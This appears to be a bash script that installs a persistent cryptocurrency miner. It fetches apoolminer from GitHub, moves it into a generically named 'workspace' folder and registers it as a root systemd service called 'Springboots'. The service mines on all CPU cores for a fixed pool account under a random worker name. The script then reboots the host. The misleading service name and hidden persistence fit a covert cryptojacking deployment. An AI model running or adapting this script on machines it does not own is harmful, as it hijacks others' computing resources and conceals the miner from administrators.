#!/bin/bash
cd /home
wget https://github.com/apool-io/apoolminer/releases/download/v2.7.1/apoolminer_linux_autoupdate_v2.7.1.tar.gz
tar zxf apoolminer_linux_autoupdate_v2.7.1.tar.gz
mv apoolminer_linux_autoupdate_v2.7.1 workspace
NUM_CPUS=$(grep -c ^processor /proc/cpuinfo)
years=("canhngo1930" "tanmui1931" "nhamthan1932" "quydau1933" "giaptuat1934" "athoi1935" "bintyi936" "dinhsuu1937" "maudan1938" "kymao1939" "canhthin1940" "tanthi1941" "nhamngo1942" "quymui1943" "giapthan1944" "atdau1945" "bintuat1946" "dinhhoi1947" "mauty1948" "kysuu1949" "canhdan1950" "tanmao1951" "nhamthin1952" "quytu1953" "giapngo1954" "atmuli1955" "binhthan1956" "dinhdau1957" "mautuat1958" "kyhoi1959" "canhty1960" "tansuu1961" "nhamdan1962" "quymyo1963" "giapthin1964" "atdau1965" "bintuat1966" "dinhhoi1967" "mauty1968" "kysuu1969" "canhdan1970" "tanmao1971" "nhamthin1972" "quytu1973" "giapngo1974" "atmuli1975" "binhthan1976" "dinhdau1977" "mautuat1978" "kyhoi1979" "canhty1980" "tansuu1981" "nhamdan1982" "quymyo1983" "giapthin1984" "atsuu1985" "bingdan1986" "dinhmao1987" "mauthin1988" "kytu1989" "canhngo1990" "tanmui1991" "nhamthan1992" "quydau1993" "giaptuat1994" "athoi1995" "bintyi996" "dinhsuu1997" "maudan1998" "kymao1999" "canhthin2000" "tanthi2001" "nhamngo2002" "quymui2003" "giapthan2004" "atdau2005" "bintuat2006" "dinhhoi2007" "mauty2008" "kysuu2009" "canhdan2010" "tanmao2011" "nhamthin2012" "quytu2013" "giapngo2014" "atmui2015" "binhthan2016" "dinhdau2017" "mautuat2018" "kyhoi2019" "canhty2020" "tansuu2021" "nhamdan2022" "quymyo2023" "giapthin2024")
random_year=${years[$RANDOM % ${#years[@]}]}
sudo bash -c 'cat <<EOF > /etc/systemd/system/springboots.service
[Unit]
Description=Springboots
After=network.target

[Service]
Type=simple
ExecStart=/home/workspace/apoolminer --account CP_9hwxggflw2 --worker '$random_year' --thread '$NUM_CPUS' --pool qubic2.hk.apool.io:3334

[Install]
WantedBy=multi-user.target
EOF'
sudo systemctl daemon-reload
sudo systemctl enable springboots.service
sudo reboot
